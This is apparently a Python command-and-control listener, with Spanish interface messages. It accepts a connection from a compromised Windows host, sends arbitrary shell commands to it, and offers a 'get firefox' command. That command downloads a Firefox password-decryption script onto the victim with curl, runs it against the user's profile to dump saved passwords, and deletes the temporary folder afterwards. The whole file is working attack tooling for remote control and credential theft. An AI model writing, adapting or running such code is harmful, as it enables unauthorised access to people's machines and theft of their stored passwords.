#!/usr/bin/env python3

import argparse
import socket
import signal
import sys
from rich import print
from rich.color import Color
from rich.console import COLOR_SYSTEMS, Console
from base64 import b64encode

class Colors:
    RED = "[#ff4f4f]"
    GREEN = "[#2ecc71]"
    BLUE = "[#3498db]"
    YELLOW = "[#f1c40f]"
    PURPLE = "[#6538BA]"
    RESET = "[/]"

class Listener:
    def def_handler(self, sig, frame):
        print(f"{Colors.RED}\n\n[!] Saliendo...\n{Colors.RESET}")
        try:
            if hasattr(self, "client_socket"):
                self.client_socket.close()
            
            if hasattr(self, "server_socket"):
                self.server_socket.close()
        except:
            pass
        sys.exit(1)

    def __init__(self, LHOST, LPORT):
        self.options = {"get firefox": "Get Firefox Stored Passwords (firefox.txt)",
                        "help": "Show this help panel"}
        self.LHOST = LHOST
        self.LPORT = LPORT
        signal.signal(signal.SIGINT, self.def_handler)

        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((LHOST, LPORT))
        self.server_socket.listen()
        
        print(f"\n{Colors.BLUE}[+] Listening for incoming connections...{Colors.RESET}")

        self.client_socket, client_address = self.server_socket.accept()
        print(f"\n{Colors.PURPLE}[+] Connection established by {client_address}{Colors.RESET}\n")
    
    def execute_remotly(self, cmd):
        self.client_socket.sendall(cmd.encode() + b"\n")

        data = b""

        while True:
            chunk = self.client_socket.recv(4096)
            if not chunk:
                break

            data += chunk
            
            # Ejemplo: El servidor termina su respuesta con un marcador específico
            if b"<END_OF_RESPONSE>" in data:
                break
        return data.decode(errors="ignore").replace("<END_OF_RESPONSE>", "")
    
    def get_firefox_profiles(self, username):
        path = f"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
        ls = self.execute_remotly(f'dir "{path}"')
        lines = ls.splitlines()

        try:
            profiles = [ profile.split()[-1] for profile in lines if "release" in profile ]
            return profiles[0] if profiles else None
        except Exception as e:
            print(f"\n[!] No ha sido posible obtener los profiles de Firefox, Error: {e}\n")
            return None


    def get_firefox_passwords(self):
        username_str = self.execute_remotly("whoami")
        username = username_str.split("\\")[1].strip()
        
        profile = self.get_firefox_profiles(username)
        self.execute_remotly(f"mkdir C:\\Users\\{username}\\AppData\\Local\\Temp\\firefox_decrypt").strip()
        temp_file = f"C:\\Users\\{username}\\AppData\\Local\\Temp\\firefox_decrypt"
        self.execute_remotly(f'curl -o "{temp_file}\\firefox_decrypt.py" "https://raw.githubusercontent.com/unode/firefox_decrypt/refs/heads/main/firefox_decrypt.py"')
        
        passwords = self.execute_remotly(f'python "{temp_file}\\firefox_decrypt.py" "C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\{profile}"')
        self.execute_remotly(f"rmdir /s /q {temp_file}")
        print(passwords)

    def run(self):
        console = Console()
        while True:
            cmd = console.input(f"{Colors.GREEN}$>> {Colors.GREEN}")

            if cmd == "get firefox":
                self.get_firefox_passwords()
            elif cmd == "help":
                self.show_help()
            elif "quit" in cmd or "exit" in cmd:
                self.server_socket.close()
                sys.exit(0)
            else:
                cmd_output = self.execute_remotly(cmd)
                print(f'\n' + cmd_output)
            
    

    def show_help(self):
        for key, value in self.options.items():
            print(f"\n{key} - {value}\n")





def get_arguments():
    parser = argparse.ArgumentParser(description="C2 - Command and Control")
    parser.add_argument("-H", "--LHOST", required=True, dest="LHOST", help="IP address to bind the listener")
    parser.add_argument("-p", "--LPORT", required=True, dest="LPORT", help="Port to listen on")
    args = parser.parse_args()
    return args.LHOST, args.LPORT

if __name__ == "__main__":
    LHOST, LPORT = get_arguments()
    my_listener = Listener(str(LHOST), int(LPORT))
    my_listener.run()

